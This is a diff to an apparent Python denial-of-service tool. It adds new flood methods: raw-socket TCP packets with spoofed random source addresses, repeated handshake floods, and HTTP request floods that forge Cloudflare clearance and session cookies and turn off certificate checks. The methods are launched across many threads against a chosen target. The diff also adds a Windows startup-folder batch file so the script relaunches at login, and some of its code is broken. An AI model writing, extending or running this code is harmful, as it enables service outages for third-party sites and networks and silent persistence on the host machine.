@@ -19,10 +19,17 @@ from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.action_chains import ActionChains
 from selenium.webdriver.support.wait import WebDriverWait
 from subprocess import Popen
+from base64 import b64decode
 from os import chdir
 from os import getcwd
 from getpass import getuser
-from base64 import b64decode
+from platform import uname
+
+if namesx == 'nt':
+    pt = getcwd()
+    chdir(f'C:\\Users\\{getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+    open('start-system.bat', 'w').write(f'START {__file__}')
+    chdir(pt)
 
 app = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', '*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html, application/xhtml+xml, image/jxr, */*', 'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1', 'text/html, image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9']
 reff = ['https://www.google.com/search?q=','https://google.com/', 'https://www.google.com/', 'https://www.bing.com/search?q=', 'https://www.bing.com/', 'https://www.youtube.com/', 'https://www.facebook.com/']
@@ -162,6 +169,34 @@ class udpxd:
     def pack(self):
         header = pack('!HHHH' , self.source_port , self.dest_port , self.length , self.checksum)
         return header + self.data
+
+def tcp_paf_data(target , port):
+        source_ip = f"{ran(1, 223)}.{ran(0, 255)}.{ran(0, 255)}.{ran(0, 255)}"
+        source_port = ran(1024, 65535)
+        seq = ran(0 , 4294967295)
+        ack = 0
+        flags = 0x18
+        tcp_header = pack('!HHLLBBHHH' , source_port , port , seq , ack , 5 << 4 , flags , 65535 , 0 , 0)
+        ip_header = pack('!BBHHHBBH4s4s' , 69 , 0 , 20 + len(tcp_header) , 54321 , 0 , 255 , 6 , 0 , inet_aton(source_ip) , inet_aton(target))
+        return ip_header + tcp_header
+
+def handshaketcp(port):
+    seq = ran(0 , 65535)
+    ack = 0
+    offset_res = (5 << 4) + 0
+    flags = 0x02
+    window = socket.htons(5840)
+    checksum = 0
+    urgent_pointer = 0
+    tcp_header = pack('!HHLLBBHHH' , port , port , seq ,ack , offset_res , flags , window , checksum , urgent_pointer)
+    return tcp_header
+
+def tcp_connhex(path , target , ua , cookie):
+    payl = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nCookie: {cookie}\r\n\r\n"
+    payl_bytes = payl.encode('utf-8')
+    hex_payload = ''.join(f'\\x{b:02x}' for b in payl_bytes)
+    return hex_payload
+
 
 def get_cookies(driver):
     cookies = driver.get_cookies()
@@ -609,7 +644,7 @@ def main():
                 try:
                     s = socket(AF_INET , SOCK_DGRAM)
                     for _ in range(rpc):
-                        payl = b'\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73\x10'
+                        payl = b'\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73'
                         s.sendto(payl , (target , port))
                 except:
                     pass
@@ -721,6 +756,63 @@ def main():
                 except:
                     pass
 
+        def tcp_paf():
+            while timer:
+                try:
+                    s = socket(AF_INET , SOCK_RAW , IPPROTO_TCP)
+                    for _ in range(rpc):
+                        payl = tcp_paf_data(target , port)
+                        s.sendto(payl , (target , port))
+                except:
+                    pass
+
+        def tcp_conn():
+            while timer:
+                try:
+                    us = UserAgent()
+                    ua = us.random
+                    ssl = create_default_context(cafile=where())
+                    ssl.check_hostname = False
+                    ssl.verify_mode = CERT_NONE
+                    parsed_url = urlparse(url)
+                    target = parsed_url.netloc
+                    path = parsed_url.path
+                    if path == "":
+                        path = "/"
+                    def generate_fake_phpsessid(length):
+                        characters = ascii_letters + digits
+                        fake_phpsessid = ''.join(che(characters) for _ in range(length))
+                        return fake_phpsessid
+                    fake_cookie_phpsessid = generate_fake_phpsessid(147)
+                    fake_cookie_phpsessidd = generate_fake_phpsessid(32)
+                    response = get(url)
+                    cookie = response.cookies
+                    if cookie == '':
+                        cookie = ("cf_clearance="+fake_cookie_phpsessid, "PHPSSID="+fake_cookie_phpsessidd)
+                    if port == 443:
+                        s = socket(AF_INET , SOCK_STREAM)
+                        s = SSLContext(PROTOCOL_TLS_SERVER , PROTOCOL_TLS , PROTOCOL_TLS_CLIENT , PROTOCOL_TLSv1 , PROTOCOL_TLSv1_1 , PROTOCOL_TLSv1_2 , PROTOCOL_SSLv23)
+                        s = ssl.wrap_socket(s , server_hostname=target)
+                        s.connect((target , port))
+                    else:
+                        s = socket(AF_INET , SOCK_STREAM)
+                        s.connect((target , port))
+                    for _ in range(rpc):
+                        payl = tcp_connhex(path , target , ua , cookie)
+                        s.sendto(payl , (target , port))
+                except:
+                    pass
+
+        def tcp_hand():
+            while timer:
+                try:
+                    s = socket(AF_INET , SOCK_STREAM)
+                    s.connect((target , port))
+                    for _ in range(rpc):
+                        payl = handshaketcp(port)
+                        s.send(payl)
+                except:
+                    pass
 
         try:
             if method == 'raw':
@@ -813,6 +905,15 @@ def main():
             elif method == 'discord':
                 for _ in range(threads):
                     thr(target=discord).start()
+            elif method == 'tcp-paf':
+                for _ in range(threads):
+                    thr(target=tcp_paf).start()
+            elif method == 'tcp-hand':
+                for _ in range(threads):
+                    thr(target=tcp_hand).start()
+            elif method == 'tcp-conn':
+                for _ in range(threads):
+                    thr(target=tcp_conn).start()
         except:
             pass
 
